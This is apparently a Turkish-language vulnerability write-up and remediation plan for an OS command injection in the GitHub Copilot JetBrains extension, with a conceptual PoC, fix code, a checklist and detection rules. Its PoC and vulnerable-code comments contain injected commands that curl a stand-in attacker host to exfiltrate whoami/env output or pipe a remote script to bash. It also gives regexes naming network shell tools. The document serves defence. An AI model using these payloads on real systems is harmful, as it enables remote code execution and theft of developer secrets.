# TODO: CVE-2026-21516 — GitHub Copilot JetBrains OS Command Injection RCE

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-21516 |
| **Kritiklik** | Yuksek |
| **Kategori Klasoru** | YENI: AI_IDE_Guvenligi/ |
| **Kaynak Arastirma** | [Vibecoding_Guvenlik_Aciklari_Subat_2026.md](../Arastirmalar/Vibecoding_Guvenlik_Aciklari_Subat_2026.md) |
| **Tarih** | 2026-03-10 |
| **Mevcut Dokuman** | Henuz yok |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-21516, GitHub Copilot'un JetBrains IDE (IntelliJ IDEA, PyCharm, WebStorm, GoLand vb.) uzantisinda tespit edilen yuksek oncelikli bir OS komut enjeksiyonu (OS Command Injection — CWE-78) zafiyetidir. Uzanti, kod analizi sirasinda dosya iceriklerini islerken girdi dogrulamasi yapmadan ozel karakterleri (`|`, `;`, `` ` ``) dogrudan sistem komut yorumlayicilarina aktarmaktadir. Bir saldirgan, Copilot'un analiz edecegi kod dosyalarina zarali metinler yerlestirerek gelistirici makinesinde yetkisiz kod yurutme (RCE) elde edebilir. Bu zafiyet, vibecoding yaklasiminin yayginlasmasi ve gelisitiricilerin AI ciktilarina guven duymasiyla birlikte ozellikle tehlikeli bir hal almaktadir; cunku saldiri vektoru dogrudan gelistirme ortamini hedef almaktadir.
*   **Etkilenen bilesenler:** GitHub Copilot JetBrains uzantisi (tum JetBrains IDE'ler: IntelliJ IDEA, PyCharm, WebStorm, GoLand, CLion, Rider, PhpStorm, RubyMine), uzantinin girdi isleme ve komut calistirma modulu, JetBrains IDE proses ortami

---

### 2. Teknik detay (nasil calisiyor)
*   GitHub Copilot JetBrains uzantisi, gelistiriciye kod onerileri sunmak icin aktif dosyanin ve projenin icerigini analiz eder. Bu analiz sirasinda dosya icerigi, uzantinin arka plan surecleri tarafindan islenir.
*   Zafiyet, uzantinin dosya iceriklerindeki ozel karakterleri (`|`, `;`, `` ` ``, `$()`, `&&`) sanitize etmeden sistem komut satirina aktarmasindan kaynaklanmaktadir. Bu, klasik bir OS Command Injection (CWE-78) hatasidir.
*   Saldirgan, hedef gelisitiricinin calismakta oldugu veya Copilot'un otomatik olarak analiz edecegi bir dosyaya (ornegin bir kaynak kod dosyasi, yorum satiri veya string literali icine) shell metacharacter'lar iceren zarali metin yerlestirir.
*   Copilot uzantisi bu dosyayi analiz ettiginde, zarali karakter dizileri uzantinin arka planda tetikledigi sistem komutlarina enjekte edilir ve gelistirici makinesinde yetkisiz kod yurutulur.
*   Saldiri vektoru, acik kaynak projeler, Pull Request incelemeleri, paylasilan kod ornekleri veya bir npm/pip paketi icindeki dosyalar uzerinden tetiklenebilir.
*   **Neden:** Kok neden, uzantinin kullanici/dis kaynak kontrollu veriyi sanitize etmeden komut satirina aktarmasidir. Giris dogrulamasi (input validation) ve cikis kodlamasi (output encoding) eksikligi, klasik bir CWE-78 (Improper Neutralization of Special Elements used in an OS Command) ornegidir. JetBrains uzantisi, dosya icerigini "guvenilir veri" olarak kabul etmektedir; ancak vibecoding caginda dosya icerikleri saldirgan tarafindan kontrol edilebilir bir girdi kaynagi haline gelmistir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** GitHub Copilot uzantisi yuklu bir JetBrains IDE (ornegin IntelliJ IDEA veya PyCharm).
*   **2. Normal durum:**
    ```
    1. Gelistirici, JetBrains IDE'de bir Python dosyasi acar
    2. Copilot uzantisi dosya icerigini otomatik olarak analiz eder
    3. Copilot, dosya baglamina uygun kod onerileri sunar
    4. Gelistirici onerileri kabul eder veya reddeder
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```
    1. Saldirgan, hedef projede bir dosya olusturur veya mevcut dosyayi degistirir
    2. Dosyaya su sekilde zarali icerik yerlestirir:

       # config.py
       PROJECT_NAME = "my-project; curl https://attacker.example/exfil?d=$(whoami)"
       # veya bir yorum satiri olarak:
       # TODO: fix bug | curl attacker.example/shell.sh | bash

    3. Gelistirici bu dosyayi JetBrains IDE'de acar
    4. Copilot uzantisi dosyayi analiz ederken string icerigini
       arka plan surecine aktarir
    5. Ozel karakterler (;, |, `) sanitize edilmeden shell'e gecirilir
    6. Saldirganin komutu gelistirici makinesinde yurutulur
    ```
*   **4. Analiz:** Copilot uzantisi, dosya icerigini `shell=True` benzeri bir mekanizmayla sistem komut satirina aktarir. Shell metacharacter'lar (`|`, `;`, `` ` ``) isletim sistemi tarafindan komut ayirici olarak yorumlanir ve saldirganin enjekte ettigi komutlar yurutulur. Gelistirici herhangi bir uyari gormez cunku uzanti arka planda calisir.
*   **5. Kanit:** Saldirganin sunucusunda HTTP istegi gorunur (`whoami` ciktisi, ortam degiskenleri veya SSH anahtarlari). JetBrains IDE'nin proses listesinde (`ps aux`) beklenmeyen `curl`, `wget` veya `bash` surecleri gorulebilir. Gelistirici tarafinda gorunen bir uyari olmaz.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Yuksek
*   **CVSS Skoru:** Yuksek (tanimlayiciya gore)
*   **Saldiri Yuzeyi:** Internete acik (kod dosyalari, acik kaynak projeler, npm/pip paketleri uzerinden)
*   **Karmasiklik:** Dusuk (saldirganin yalnizca dosya icerigine zarali metin yerlestirmesi yeterli)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** GitHub Copilot JetBrains uzantisini Microsoft'un yamali surumune hemen guncelleyin. Guncel olmayan uzanti surumlerini kullanan gelisitiricileri tespit edin ve bilgilendirin. Copilot uzantisinin eristigi dosyalari kisitlayin (guvenilmeyen projelerde Copilot'u devre disi birakin).
*   **Orta vadeli:** JetBrains IDE'lerdeki tum Copilot uzanti ayarlarini merkezi olarak yonetin (JetBrains Toolbox veya MDM uzerinden). CI/CD pipeline'larinda kod dosyalarina shell metacharacter enjeksiyonu tarayan SAST kurallari ekleyin. Gelistiricilere AI IDE uzantilari uzerinden gelen saldiri vektorleri hakkinda egitim verin. JetBrains IDE proses ortaminda network egress filtrelemesi uygulayin.
*   **Uzun vadeli:** AI IDE uzantilarinin girdi isleme katmanlarinda guvenlik denetimlerini standartlastirin (shell=False zorunlulugu, parametrize komut calistirma). Kurumsal duzeyde AI IDE uzanti guvenlik politikasi olusturun. Uzanti guvenlik denetimlerini periyodik olarak tekrarlayin. OWASP ASI Top 10 standartlarini AI gelistirme araclarina uygulayin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```python
# === GUVENSIZ: AI ciktisini dogrudan shell'e aktarma ===
import subprocess

def analyze_file(file_content: str):
    # Dosya icerigini dogrudan shell komutuna gecirme — COMMAND INJECTION!
    result = subprocess.run(
        f"copilot-analyzer process '{file_content}'",
        shell=True,  # Tehlikeli: shell metacharacter yorumlanir
        capture_output=True,
        text=True
    )
    return result.stdout

# Saldirgan dosya icerigi: "test'; curl attacker.example/exfil?d=$(env | base64) #"
# Shell yurutur: copilot-analyzer process 'test'; curl attacker.example/exfil?d=BASE64DATA #'
```

**Guvenli kod:**
```python
# === GUVENLI: shell=False + girdi dogrulamasi + allowlist ===
import subprocess
import re
from pathlib import Path

# Izin verilen komutlar ve guvenli arguman kaliplari
ALLOWED_COMMANDS = {"analyze", "lint", "format", "suggest"}
SAFE_ARG_PATTERN = re.compile(r'^[a-zA-Z0-9_./ -]+$')

def analyze_file_safe(command: str, file_path: str):
    # 1. Komutu allowlist ile dogrula
    if command not in ALLOWED_COMMANDS:
        raise ValueError(f"Izin verilmeyen komut: {command}")

    # 2. Dosya yolunu dogrula (path traversal onlemi)
    resolved = Path(file_path).resolve()
    if not str(resolved).startswith("/workspace/"):
        raise ValueError(f"Izin verilmeyen dosya yolu: {file_path}")

    # 3. shell=False ile calistir — metacharacter yorumlanmaz
    result = subprocess.run(
        ["copilot-analyzer", command, str(resolved)],
        shell=False,       # Guvenli: argumanlar ayri gecirilir
        capture_output=True,
        text=True,
        timeout=30,        # Sonsuz donguyu onle
        env={"PATH": "/usr/local/bin:/usr/bin"}  # Minimal PATH
    )
    return result.stdout

# Ayrica: JetBrains uzantisini guncelle
# JetBrains IDE > Settings > Plugins > GitHub Copilot > Update
# Minimum surum: Copilot for JetBrains v2.13.x (CVE-2026-21516 duzeltmesi)
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Kurumsal ortamda GitHub Copilot JetBrains uzantisi kullanan tum gelisitiricileri envanterleyin
*   [ ] Mevcut Copilot uzanti surumlerini kontrol edin (yamali surum: v2.13.x+)
*   [ ] JetBrains IDE envanterini cikarin (IntelliJ, PyCharm, WebStorm vb.)
*   [ ] Gelisitiricilerin calistigi projelerde guvenilmeyen kaynaklardan gelen dosyalari belirleyin

**Duzeltme**
*   [ ] GitHub Copilot JetBrains uzantisini yamali surume guncelleyin
*   [ ] Guncel olmayan uzanti surumlerini kullanan gelisitiricileri bilgilendirin
*   [ ] CI/CD pipeline'ina shell metacharacter enjeksiyonu tarayan SAST kurali ekleyin
*   [ ] JetBrains IDE proses ortaminda gereksiz network erisimini kisitlayin
*   [ ] Guvenilmeyen projelerde Copilot'u gecici olarak devre disi birakin

**Dogrulama**
*   [ ] Shell metacharacter iceren dosyalarin Copilot uzerinden RCE tetiklemedigini kontrolllu ortamda test edin
*   [ ] Uzanti surum numarasini tum gelisitiricilerde dogrulayin
*   [ ] JetBrains IDE proses listesinde beklenmeyen sureclerin olusmadigini dogrulayin
*   [ ] SAST kurallarinin zarali icerik iceren dosyalari basariyla tespit ettigini dogrulayin

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   JetBrains IDE sureclerinden kaynaklanan beklenmeyen cocuk surecleri izleyin (curl, wget, bash, sh, nc, python)
    *   Copilot uzanti loglarinda hata veya beklenmeyen komut calistirma olaylarini arayın
    *   Regex (surec izleme): `(?i)(idea|pycharm|webstorm|goland|clion).*?(child_process|spawn|exec).*?(curl|wget|bash|nc|python|perl)`
    *   Regex (kod dosyasi tarama): `(?i)([;|` + "`" + `]|\$\()\s*(curl|wget|bash|nc|cat\s+/etc|env\b|whoami)`
    *   Network egress loglarinda JetBrains IDE surecinden bilinmeyen harici sunuculara baglanti girisimlerini izleyin
*   **Anomali Tespiti:**
    *   JetBrains IDE surecinden beklenmeyen outbound HTTP/HTTPS istekleri
    *   Copilot uzantisinin analiz sirasinda shell sureci olusturmasi
    *   Gelistirici makinesinde kisa sure icinde birden fazla bilinmeyen domaine DNS sorgusu
    *   Kod dosyalarinda olagandiisi yogunlukta shell metacharacter bulunmasi
    *   JetBrains IDE surecinin normalden fazla CPU/bellek tuketmesi (uzun sureli komut yurutme gostergesi)

---

## Notlar
CWE-78 (OS Command Injection). Saldiri vektoru, kod dosyalari uzerinden tetiklenir; acik kaynak projeler, Pull Request incelemeleri ve paylasilan kod ornekleri potansiyel saldiri kanallardir. JetBrains IDE ailesindeki tum urunleri etkiler. Vibecoding ortamlarinda gelistiricilerin AI ciktilarina duydugu guven, bu tur zafiyetlerin istismar edilmesini kolaylastirir. RoguePilot saldirisiyla birlestirildiginde tedarik zinciri kompromizasyonuna yol acabilir.
